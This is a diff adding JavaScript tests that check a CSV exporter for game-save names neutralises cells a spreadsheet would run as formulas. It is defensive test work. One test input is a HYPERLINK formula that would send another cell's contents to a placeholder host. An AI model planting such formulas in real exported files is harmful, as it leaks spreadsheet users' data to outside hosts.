@@ -108,3 +108,32 @@ describe('exportName', () => {
     )
   })
 })
+
+/* -------------------------------------------------------------------------
+   Formula injection
+
+   Names in a save are written by whoever played on it.
+   ------------------------------------------------------------------------- */
+
+describe('toCsv — cells a spreadsheet would run', () => {
+  it('neutralises text that starts like a formula', () => {
+    const names = [
+      '=HYPERLINK("http://x.invalid/?"&A2,"click")',
+      '@SUM(1+1)',
+      '+1',
+      '-2+3',
+    ]
+    const out = rows(toCsv(names.map((name) => ({ name })), COLUMNS)).slice(1) // prettier-ignore
+    for (const line of out) {
+      // Quoted or not, the first character of the value is no longer one a
+      // spreadsheet treats as the start of a formula.
+      expect(line.replace(/^"/, '')).not.toMatch(/^[=+\-@]/)
+    }
+  })
+
+  it('leaves a negative number as a number', () => {
+    // The other half of the rule: only text is escaped.
+    const csv = toCsv([{ name: 'Lamball', level: -5 }], COLUMNS)
+    expect(rows(csv)[1]).toBe('Lamball,-5,')
+  })
+})
